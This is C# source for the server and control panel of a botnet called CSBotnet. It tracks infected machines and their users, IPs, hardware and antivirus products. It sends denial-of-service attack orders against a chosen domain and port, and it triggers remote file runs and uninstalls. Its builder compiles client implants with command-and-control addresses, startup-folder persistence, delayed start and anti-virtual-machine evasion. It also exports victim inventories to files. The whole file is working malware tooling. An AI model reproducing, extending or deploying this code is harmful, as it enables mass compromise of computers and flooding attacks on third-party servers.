using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Diagnostics;
using System.Reflection;

namespace CSBotnet.Server
{
    public partial class MainWin : Form
    {
        public static TcpListener Server;
        public static bool IsWindowRunning = true;

        public MainWin()
        {
            InitializeComponent();

            UserConfig.LoadConfig();

            Logger.Init(LogsListView);
            DashboardUtils.Init(DashboardListView);
            OnlineClients.Init(DashboardListView);

            ImageList imageList = new ImageList();
            AttackingClientsListView.SmallImageList = imageList;

            ServerPortEntry.Text = Convert.ToString(UserConfig.ServerPort);

            foreach (string Ip in UserConfig.BlackListedIPs)
            {
                BlacklistedIpsListbox.Items.Add(Ip);
            }

            foreach (string UUID in UserConfig.BlackListedUUIDs)
            {
                BlackListedUUIDsListbox.Items.Add(UUID);
            }

            ClientCountTrackBar.Maximum = 0;

            new Thread(StartServer).Start();
        }

        private void BlacklistIpEntry_Enter(object sender, EventArgs e)
        {
            BlacklistIpEntry.Text = "";
        }

        private void StartServer()
        {
            Server = new TcpListener(IPAddress.Any, UserConfig.ServerPort);
            try
            {
                Server.Start();
            }
            catch (Exception ex)
            {
                MsgBox.Error("Couldn't start server", $"An error occured while starting the server : {ex.Message}");
                return;
            }

            Logger.Info($"Server started listening on port {UserConfig.ServerPort}");

            while (IsWindowRunning)
            {
                if (Server.Pending())
                {
                    TcpClient client = Server.AcceptTcpClient();
                    Thread clientThread = new Thread(() => HandleClient(client));
                    clientThread.Start();
                }
                else
                {
                    Thread.Sleep(100);
                }
            }

            Server.Stop();
        }

        private void HandleClient(TcpClient client)
        {
            try
            {
                string ClientRawDatas = Network.ReceiveString(client.GetStream());

                JsonDocument ClientInfos = JsonDocument.Parse(ClientRawDatas.Replace("<NewConnDatas>", ""));
                JsonElement Root = ClientInfos.RootElement;

                string UserName = Root.GetProperty("userName").GetString();
                string MachineName = Root.GetProperty("machineName").GetString();
                string MachineUUID = Root.GetProperty("machineId").GetString();
                string OsDetails = Root.GetProperty("osDetails").GetString();
                string CountryCode = Root.GetProperty("countryCode").GetString();
                string Cpu = Root.GetProperty("cpu").GetString();
                string Gpu = Root.GetProperty("gpu").GetString();
                string Ram = Root.GetProperty("ram").GetString();
                string IpAddress = Root.GetProperty("ipAddress").GetString();

                string[] Antiviruses = Root.GetProperty("antiviruses").GetString().Split(";");

                if (UserConfig.BlackListedIPs.Contains(IpAddress))
                {
                    Network.SendString(client.GetStream(), "<Exit>");
                    return;
                }
                else if (UserConfig.BlackListedUUIDs.Contains(MachineUUID))
                {
                    Network.SendString(client.GetStream(), "<Exit>");
                    return;
                }

                Client _client = new Client(IpAddress, CountryCode, UserName, MachineName, Gpu, Cpu, Ram, MachineUUID, OsDetails, Antiviruses, client.GetStream(), client);

                OnlineClients.AddClient(_client);

                ClientCountTrackBar.Invoke(() => ClientCountTrackBar.Maximum += 1);

                new Thread(() => PingLoop(client)).Start();

                Logger.Info("New client connected : " + UserName + "@" + IpAddress);
            }
            catch
            {

            }
        }

        private void PingLoop(TcpClient client)
        {
            while (IsWindowRunning)
            {
                try
                {
                    Network.SendString(client.GetStream(), "<PING>");
                }
                catch
                {
                    string id = null;

                    var target = OnlineClients.Clients.FirstOrDefault(c => c.Value.Socket == client);

                    if (!string.IsNullOrEmpty(target.Key))
                    {
                        id = target.Value.Id;
                        OnlineClients.Clients.Remove(target.Key);
                    }

                    if (id != null)
                    {
                        DashboardListView.Invoke(new Action(() =>
                        {
                            foreach (ListViewItem item in DashboardListView.Items)
                            {
                                if (item.SubItems[4].Text == id)
                                {
                                    DashboardListView.Items.Remove(item);
                                    break;
                                }
                            }
                        }));
                    }

                    ClientCountTrackBar.Invoke(() => ClientCountTrackBar.Maximum -= 1);

                    Logger.Info("Client disconnected - ID " + id);
                    return;
                }

                Thread.Sleep(1000);
            }
        }


        private void BlacklistUuidEntry_Enter(object sender, EventArgs e)
        {
            BlacklistUuidEntry.Text = "";
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            string? Content = BlacklistIpEntry.Text.Trim();

            if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove IP Address to blacklist" && !BlacklistedIpsListbox.Items.Contains(Content))
            {
                BlacklistedIpsListbox.Items.Add(Content);
                BlacklistIpEntry.Text = "";

                UserConfig.BlackListedIPs.Add(Content);
                UserConfig.UpdateConfig();
            }
        }

        private void BlacklistIpEntry_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string? Content = BlacklistIpEntry.Text.Trim();

            if (BlacklistedIpsListbox.SelectedItems.Count > 0)
            {
                object? SelectedItem = BlacklistedIpsListbox.SelectedItem;

                BlacklistedIpsListbox.Items.Remove(SelectedItem);

                UserConfig.BlackListedIPs.Remove(SelectedItem.ToString());
                UserConfig.UpdateConfig();
            }
            else if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove IP Address to blacklist")
            {
                if (BlacklistedIpsListbox.Items.Contains(Content))
                {
                    BlacklistedIpsListbox.Items.Remove(Content);
                    BlacklistIpEntry.Text = "";

                    UserConfig.BlackListedIPs.Remove(Content);
                    UserConfig.UpdateConfig();
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string? Content = BlacklistUuidEntry.Text.Trim();

            if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove UUID to blacklist" && !BlackListedUUIDsListbox.Items.Contains(Content))
            {
                BlackListedUUIDsListbox.Items.Add(Content);
                BlacklistUuidEntry.Text = "";

                UserConfig.BlackListedUUIDs.Add(Content);
                UserConfig.UpdateConfig();

            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            string? Content = BlacklistUuidEntry.Text.Trim();

            if (BlackListedUUIDsListbox.SelectedItems.Count > 0)
            {
                object? SelectedItem = BlackListedUUIDsListbox.SelectedItem;

                BlackListedUUIDsListbox.Items.Remove(SelectedItem);

                UserConfig.BlackListedUUIDs.Remove(SelectedItem.ToString());
                UserConfig.UpdateConfig();
            }
            else if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove UUID to blacklist")
            {
                if (BlackListedUUIDsListbox.Items.Contains(Content))
                {
                    BlackListedUUIDsListbox.Items.Remove(Content);
                    BlacklistUuidEntry.Text = "";

                    UserConfig.BlackListedUUIDs.Remove(Content);
                    UserConfig.UpdateConfig();
                }
            }
        }

        private void BlacklistIpEntry_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string? Content = BlacklistIpEntry.Text.Trim();

                if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove IP Address to blacklist" && !BlacklistedIpsListbox.Items.Contains(Content))
                {
                    BlacklistedIpsListbox.Items.Add(Content);
                    BlacklistIpEntry.Text = "";

                    UserConfig.BlackListedIPs.Add(Content);
                    UserConfig.UpdateConfig();
                }
            }
        }

        private void button3_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string? Content = BlacklistIpEntry.Text.Trim();

                if (!string.IsNullOrEmpty(Content) && Content != "Add/Remove UUID to blacklist" && !BlackListedUUIDsListbox.Items.Contains(Content))
                {
                    BlackListedUUIDsListbox.Items.Add(Content);
                    BlacklistUuidEntry.Text = "";

                    UserConfig.BlackListedUUIDs.Add(Content);
                    UserConfig.UpdateConfig();
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string? StrPort = ServerPortEntry.Text.Trim();
            int Port;

            try
            {
                Port = Convert.ToInt32(StrPort);
            }
            catch
            {
                MsgBox.Error("Invalid port", "Please enter a valid port");
                return;
            }

            if (Port > 65535)
            {
                MsgBox.Error("Invalid port", "Please enter a valid port");
                return;
            }

            UserConfig.ServerPort = Port;
            UserConfig.UpdateConfig(true, this);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UserConfig.UpdateConfig();
            IsWindowRunning = false;
        }

        private void LogsListView_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                LogsMenuStrip.Show(Cursor.Position);
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (LogsListView.SelectedItems.Count > 0)
            {
                StringBuilder sb = new StringBuilder();

                foreach (ListViewItem item in LogsListView.SelectedItems)
                {
                    sb.AppendLine(item.SubItems[0].Text + " | " + item.SubItems[1].Text + " | " + item.SubItems[2].Text);
                }

                Clipboard.SetText(sb.ToString());
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (LogsListView.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in LogsListView.SelectedItems)
                {
                    LogsListView.Items.Remove(item);
                }
            }
        }

        private void AttackDurationTrackbar_Scroll(object sender, EventArgs e)
        {
            AttackDurationLabel.Text = AttackDurationTrackbar.Value.ToString() + " seconds";
        }

        private void AttackDurationLabel_Click(object sender, EventArgs e)
        {
        }

        private void ClientCountTrackBar_Scroll(object sender, EventArgs e)
        {
            ClientCountLabel.Text = ClientCountTrackBar.Value.ToString();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            string Url = TargetDomainEntry.Text;
            string StrPort = TargetPortEntry.Text;
            int Port;

            if (string.IsNullOrEmpty(Url) || string.IsNullOrEmpty(StrPort))
            {
                MsgBox.Error("Invalid datas", "Please enter a domain and a port");
                return;
            }

            try
            {
                Port = Convert.ToInt32(StrPort);
            }
            catch
            {
                MsgBox.Error("Invalid datas", "Please enter a valid port");
                return;
            }

            if (ClientCountTrackBar.Value == 0)
            {
                MsgBox.Error("Invalid datas", "Please choose at least 1 client");
                return;
            }

            new Thread(() => Attack(ClientCountTrackBar.Invoke(() => ClientCountTrackBar.Value), AttackDurationTrackbar.Invoke(() => AttackDurationTrackbar.Value), Url, Port)).Start();
        }

        private void Attack(int ClientCount, int Duration, string Url, int Port)
        {
            int Total = 0;

            foreach (KeyValuePair<string, Client> Pair in OnlineClients.Clients)
            {
                if (Total == ClientCount)
                {
                    break;
                }

                Client client = Pair.Value;

                Network.SendString(client.Stream, $"<Attack>{Url};{Port};{Duration};{client.Id}");

                ImageList imageList = AttackingClientsListView.Invoke(() => AttackingClientsListView.SmallImageList);

                AttackingClientsListView.Invoke(() => imageList.ImageSize = new Size(30, 18));
                AttackingClientsListView.Invoke(() => imageList.Images.Add(client.CountryCode, System.Drawing.Image.FromFile(client.CountryFlagPath)));

                ListViewItem item = new ListViewItem("");

                item.SubItems.Add(client.Ip + "@" + client.Username);
                item.SubItems.Add(Url + ":" + Port.ToString());
                item.SubItems.Add(client.Id);

                item.ImageKey = client.CountryCode;

                AttackingClientsListView.Invoke(new Action(() => AttackingClientsListView.Items.Add(item)));

                while (true)
                {
                    string Response = Network.ReceiveString(client.Stream);

                    if (Response.StartsWith("<StoppedAttacking>"))
                    {
                        string _clientID = Response.Replace("<StoppedAttacking>FROM:", "");
                        AttackingClientsListView.Invoke(() => AttackingClientsListView.Items.Remove(item));
                        break;
                    }
                }

                return;
            }
        }

        private void CheckTargetServerBtm_Click(object sender, EventArgs e)
        {

        }

        private void cleintInformationsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!DashboardUtils.IsAnyClientSelected())
            {
                return;
            }

            ClientInfosWin ClientInfosWindow = new ClientInfosWin();

            ClientInfosWindow.Show();

            new Thread(() => GetClientInfos(ClientInfosWindow)).Start();
        }

        private void GetClientInfos(ClientInfosWin ClientInfosWindow)
        {
            Client client = DashboardUtils.GetSelectedClient();

            ClientInfosWindow.Invoke(() => ClientInfosWindow.Text = $"{client.Username}@{client.Ip} | Client's Informations | Loading...");

            try
            {
                Network.SendString(client.Stream, "<GetClientInfos>");

                string Response = Network.ReceiveString(client.Stream);

                if (Response.StartsWith("<Error>"))
                {
                    MsgBox.Error("An error occured", "A client side error occured : \n\n" + Response.Replace("<Error>", ""));
                }
                else
                {
                    string[] Datas = Response.Split("||");

                    foreach (string Data in Datas)
                    {
                        string[] DatasArray = Data.Split(":");

                        ListViewItem item = new ListViewItem(DatasArray[0].Trim());

                        item.SubItems.Add(DatasArray[1].Trim());

                        ClientInfosWindow.Invoke(() => ClientInfosWindow.ClientInfosListView.Items.Add(item));
                    }

                    ClientInfosWindow.Invoke(() => ClientInfosWindow.Text = $"{client.Username}@{client.Ip} | Client's Informations | Done");
                    Logger.Info($"Client {client.Username}@{client.Ip} system informations retrieved");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"An error occured while getting client{client.Username}@{client.Ip} infos : \n\n" + ex.Message);
                MsgBox.Error("Couldn't get client informations", "An error occured while getting client's infos : \n\n" + ex.Message);
            }
        }

        private void DashboardListView_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ClientOptionsCtxMenu.Show(Cursor.Position);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DashboardUtils.IsAnyClientSelected())
            {
                Client client = DashboardUtils.GetSelectedClient();

                Network.SendString(DashboardUtils.GetSelectedClient().Stream, "<Exit>");
                Logger.Info($"Client {client.Username}@{client.Ip} disconnected.");
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DashboardUtils.IsAnyClientSelected())
            {
                Network.SendString(DashboardUtils.GetSelectedClient().Stream, "<Restart>");
                Logger.Info(@"Client {client.Username}@{client.Ip} restarted");
            }
        }

        private void runFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DashboardUtils.IsAnyClientSelected())
            {
                DlExeWin DlExeWindow = new DlExeWin();
                DlExeWindow.Show();
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(BuilderC2Entry.Text) || BuilderC2Entry.Text == "Add/Remove C2 here...")
                return;

            foreach (string C2 in C2sListbox.Items)
            {
                if (C2 == BuilderC2Entry.Text)
                    return;
            }

            C2sListbox.Items.Add(BuilderC2Entry.Text);
            BuilderC2Entry.Text = "";
        }

        private void textBox2_Enter(object sender, EventArgs e)
        {
            BuilderPortEntry.Text = "";
        }

        private void BuilderPortEntry_TextChanged(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (BuilderStartupCbx.Checked)
                BuilderStartupScope.Enabled = true;
            else
                BuilderStartupScope.Enabled = false;
        }

        private void SleepTimeEntry_SelectedItemChanged(object sender, EventArgs e)
        {

        }

        private void BuilderSleepCbx_CheckedChanged(object sender, EventArgs e)
        {
            if (BuilderSleepCbx.Checked)
                SleepTimeEntry.Enabled = true;
            else
                SleepTimeEntry.Enabled = false;
        }

        private void button11_Click(object sender, EventArgs e)
        {
            if (C2sListbox.Items.Count == 0)
            {
                MsgBox.Error("Missing datas", "Please provide at least 1 c2");
                return;
            }

            if (string.IsNullOrEmpty(BuilderFileNameEntry.Text))
            {
                MsgBox.Error("Invalid datas", "Please provide a valid file name");
                return;
            }

            foreach (char _char in BuilderFileNameEntry.Text.ToCharArray())
            {
                if (Path.GetInvalidFileNameChars().Contains(_char))
                {
                    MsgBox.Error("Invalid datas", "The file name contains invalid characters");
                    return;
                }
            }

            if (string.IsNullOrEmpty(BuilderMutexEntry.Text))
            {
                MsgBox.Error("Invalid datas", "Please provide a mutex");
                return;
            }

            if (BuilderMutexEntry.Text.Contains("\\"))
            {
                MsgBox.Error("Invalid datas", "The mutex contains invalid characters");
                return;
            }

            try
            {
                if (Convert.ToInt32(BuilderPortEntry.Text) > 65535)
                {
                    MsgBox.Error("Invalid datas", "The max port value is 65 535");
                    return;
                }
            }
            catch
            {
                MsgBox.Error("Invalid datas", "Please provide a valid port");
                return;
            }

            BuildConfig config = new BuildConfig();

            config.FileName = BuilderFileNameEntry.Text.Replace(".exe", "");
            config.Mutex = BuilderMutexEntry.Text;
            config.Port = BuilderPortEntry.Text;

            if (BuilderStartupCbx.Checked)
            {
                if (string.IsNullOrEmpty(BuilderStartupScope.Text))
                {
                    MsgBox.Error("Invalid datas", "Please choose a startup scope");
                    return;
                }

                config.Startup = true;

                if (BuilderStartupScope.Text == "User Scope")
                    config.StartupScope = "<User>";
                else
                    config.StartupScope = "<Machine>";
            }

            if (BuilderSleepCbx.Checked)
            {
                config.SleepBeforeStart = true;
                config.SleepTime = Convert.ToInt32(SleepTimeEntry.Text);
            }

            if (BuilderAntiVmCbx.Checked)
                config.AntiVM = true;

            new Thread(() => Build(config)).Start();
        }

        private void Build(BuildConfig config)
        {
            CheckBox[] CbToDisable = { BuilderAntiVmCbx, BuilderSleepCbx, BuilderStartupCbx };
            TextBox[] TbToDisable = { BuilderPortEntry, BuilderFileNameEntry };
            NumericUpDown[] NupdToDisable = { SleepTimeEntry, TimeBetweenReconnnectsEntry };

            BuilderC2Entry.Invoke(() => BuilderC2Entry.Text = "Add/Remove C2 here...");
            BuilderC2Entry.Invoke(() => BuilderC2Entry.Enabled = false);
            BuilderC2Entry.Invoke(() => BuildBtn.Enabled = false);

            foreach (var _ in CbToDisable)
            {
                _.Invoke(() => _.Enabled = false);
            }

            foreach (var _ in TbToDisable)
            {
                _.Invoke(() => _.Enabled = false);
            }

            foreach (var _ in NupdToDisable)
            {
                _.Invoke(() => _.Enabled = false);
            }

            Logger.Info("Starting to build a new payload");

            BuildBtn.Invoke(() => BuildBtn.Text = "Building...");

            Directory.CreateDirectory("./CSBotnet.Build");

            Process dotnet = new Process();

            dotnet.StartInfo.FileName = "dotnet.exe";
            dotnet.StartInfo.Arguments = "new console -o ./CSBotnet.Build";
            dotnet.StartInfo.CreateNoWindow = true;

            dotnet.Start();
            dotnet.WaitForExit();

            if (dotnet.ExitCode != 0)
            {
                MsgBox.Error("Build error", $"An error occured while building the project : return code {dotnet.ExitCode} from dotnet.");
                Directory.Delete("./CSBotnet.Build", recursive: true);

                BuilderC2Entry.Invoke(() => BuilderC2Entry.Enabled = true);
                BuilderC2Entry.Invoke(() => BuildBtn.Enabled = true);

                foreach (var _ in CbToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                foreach (var _ in TbToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                foreach (var _ in NupdToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                return;
            }

            string ProjectPath = "./CSBotnet.Build";
            string ProjectCSProj = "./CSBotnet.Build/CSBotnet.Build.csproj";
            string ProjectProgram = "./CSBotnet.Build/Program.cs";

            File.WriteAllText(ProjectCSProj, Payloads.CSProj.XML.Replace("{__FILE_NAME__}", config.FileName));

            string BaseClient = Payloads.ClientProgram.Script;

            if (config.AntiVM)
                BaseClient = BaseClient.Replace("{__ANTIVM_CALL__}", Payloads.AntiVM.Call).Replace("{__ANTIVM_FUNC__}", Payloads.AntiVM.Script);
            else
                BaseClient = BaseClient.Replace("{__ANTIVM_CALL__}", "").Replace("{__ANTIVM_FUNC__}", "");

            if (config.Startup)
            {
                string SPath;

                if (config.StartupScope == "<User>")
                    SPath = "Environment.GetFolderPath(Environment.SpecialFolder.Startup)";
                else
                    SPath = @"""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""";

                BaseClient = BaseClient.Replace("{__STARTUP_FUNC__}", Payloads.Startup.Script).Replace("{__STARTUP_CALL__}", Payloads.Startup.Call).Replace("{__STARTUP_SCOPE__}", SPath);
            }
            else
                BaseClient = BaseClient.Replace("{__STARTUP_FUNC__}", "").Replace("{__STARTUP_CALL__}", "");

            List<string> TmpC2s = new List<string> { };

            foreach (string C2 in C2sListbox.Items)
            {
                TmpC2s.Add("\"" + C2 + "\"");
            }

            BaseClient = BaseClient.Replace("{__START_DELAY__}", Convert.ToInt32(config.SleepTime * 1000).ToString()).Replace("{__RECON_DELAY__}", Convert.ToInt32(config.TimeBetweenReconnects * 1000).ToString()).Replace("{__MUTEX__}", config.Mutex).Replace("{__PORT__}", config.Port).Replace("{__C2S__}", string.Join(", ", TmpC2s));

            File.WriteAllText(ProjectProgram, BaseClient);

            Directory.CreateDirectory("./CSBotnet.Dist");

            string DistPath = "./CSBotnet.Dist";

            Process dotnetCompiler = new Process();

            dotnetCompiler.StartInfo.FileName = "dotnet.exe";
            dotnetCompiler.StartInfo.Arguments = $"publish {ProjectCSProj} -o {DistPath} /p:AssemblyName={config.FileName}";
            dotnetCompiler.StartInfo.CreateNoWindow = true;

            dotnetCompiler.Start();
            dotnetCompiler.WaitForExit();

            if (dotnetCompiler.ExitCode != 0)
            {
                MsgBox.Error("Build error", $"An error occured while compiling the build : return code {dotnetCompiler.ExitCode} from dotnet.");
                Directory.Delete("./CSBotnet.Build", recursive: true);

                BuilderC2Entry.Invoke(() => BuilderC2Entry.Enabled = true);
                BuilderC2Entry.Invoke(() => BuildBtn.Enabled = true);

                foreach (var _ in CbToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                foreach (var _ in TbToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                foreach (var _ in NupdToDisable)
                {
                    _.Invoke(() => _.Enabled = true);
                }

                return;
            }

            Process explorer = new Process();

            explorer.StartInfo.FileName = "explorer.exe";
            explorer.StartInfo.Arguments = Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "CSBotnet.Dist");
            explorer.StartInfo.CreateNoWindow = true;

            explorer.Start();

            BuildBtn.Invoke(() => BuildBtn.Text = "Build");

            Directory.Delete(ProjectPath, recursive: true);

            BuilderC2Entry.Invoke(() => BuilderC2Entry.Enabled = true);
            BuilderC2Entry.Invoke(() => BuildBtn.Enabled = true);

            foreach (var _ in CbToDisable)
            {
                _.Invoke(() => _.Enabled = true);
            }

            foreach (var _ in TbToDisable)
            {
                _.Invoke(() => _.Enabled = true);
            }

            foreach (var _ in NupdToDisable)
            {
                _.Invoke(() => _.Enabled = true);
            }

            MsgBox.Info("Builder", "Build finished !");

        }

        private void textBox2_Enter_1(object sender, EventArgs e)
        {
            BuilderMutexEntry.Text = "";
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            BuilderC2Entry.Text = "";
        }

        private void button10_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(BuilderC2Entry.Text) || BuilderC2Entry.Text == "Add/Remove C2 here...")
                return;

            if (C2sListbox.Items.Contains(BuilderC2Entry.Text))
            {
                C2sListbox.Items.Remove(BuilderC2Entry.Text);
                BuilderC2Entry.Text = "";
            }
        }
        private void button6_Click(object sender, EventArgs e)
        {
            if (!MsgBox.AskYesNo("Wait", "This action will disconnect all clients. Are you sure you want to continue ?", "Question"))
                return;

            Logger.Info("Starting to uninstall all clients");

            foreach (KeyValuePair<string, Client> Pair in OnlineClients.Clients)
            {
                Network.SendString(Pair.Value.Stream, "<Uninstall>");
            }

            Logger.Info("All clients have been uninstalled.");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            if (!MsgBox.AskYesNo("Wait", "This action will disconnect all clients. Are you sure you want to continue ?", "Question"))
                return;

            Logger.Info("Starting to uninstall all clients");

            foreach (KeyValuePair<string, Client> Pair in OnlineClients.Clients)
            {
                Network.SendString(Pair.Value.Stream, "<Exit>");
            }

            Logger.Info("All clients have been disconnected.");
        }

        private void StartRecoveryBtn_Click(object sender, EventArgs e)
        {
            string now = DateTime.Now.ToString().Replace("/", "_").Replace(":", "-"); 
            string DistFile = $"CSBotnet.Recovery/Recovery_" + now + ".txt";

            StringBuilder sb = new StringBuilder();

            sb.AppendLine("<===============================================>\n");

            foreach (KeyValuePair<string, Client> Pair in OnlineClients.Clients)
            {
                Client client = Pair.Value;
                string CID = Pair.Key;

                sb.AppendLine($"[ {client.MachineName} ]");

                if (ClientIpsAddrCheckbox.Checked)
                    sb.AppendLine("IP Address  : " + client.Ip);

                if (ClientsIdsCheckbox.Checked)
                    sb.AppendLine("Client ID   : " + CID);

                if (ClientSysinfosCheckbox.Checked)
                {
                    sb.AppendLine("CPU         : " + client.CPU);
                    sb.AppendLine("GPU         : " + client.GPU);
                    sb.AppendLine("RAM         : " + client.RAM);
                    sb.AppendLine("OS          : " + client.Os);
                }

                if (ClientAntivirusesCheckbox.Checked)
                    sb.AppendLine("Antiviruses : " + string.Join(", ", client.Antiviruses));

                sb.AppendLine("");
            }

            sb.AppendLine("<===============================================>\n");

            Directory.CreateDirectory("./CSBotnet.Recovery");

            File.WriteAllText(DistFile, sb.ToString());

            Process explorer = new Process();

            explorer.StartInfo.FileName = "explorer.exe";
            explorer.StartInfo.Arguments = Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "CSBotnet.Recovery", "Recovery_" + now + ".txt");
            explorer.StartInfo.CreateNoWindow = true;

            explorer.Start();
        }
    }
}
